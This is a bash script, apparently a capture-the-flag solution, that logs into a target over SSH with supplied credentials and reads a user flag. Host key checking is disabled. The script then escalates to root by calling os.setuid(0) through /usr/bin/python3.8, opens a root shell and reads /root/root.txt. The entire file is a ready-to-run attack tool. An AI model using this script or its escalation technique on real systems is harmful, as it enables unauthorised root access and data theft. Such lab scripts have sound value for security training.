#!/bin/bash

help_run=("-h" "--help")

# Check if any of the first three arguments match help options
for i in "$1" "$2" "$3" "$4"; do
    if [[ " ${help_run[*]} " == *" $i "* ]]; then
        echo "Usage: ./tool.sh <ip> <user> <pass>"
        exit 0
    fi
done

ip=$1
user=$2
pass=$3

# SSH login using sshpass
echo "Logging into SSH..."

echo "Printinf ssh banner"
sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$user@$ip" << EOF
whoami
cat /home/$user/user.txt
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("whoami")'
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("sh")'
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("cat /root/root.txt")'
EOF

# Check the exit status of the SSH command
# $? it holds the last command output, if the command fail it run the else if not than success. 
if [ $? -eq 0 ]; then
    echo "[+] SSH session completed successfully."
else
    echo "[-] SSH login failed."
fi
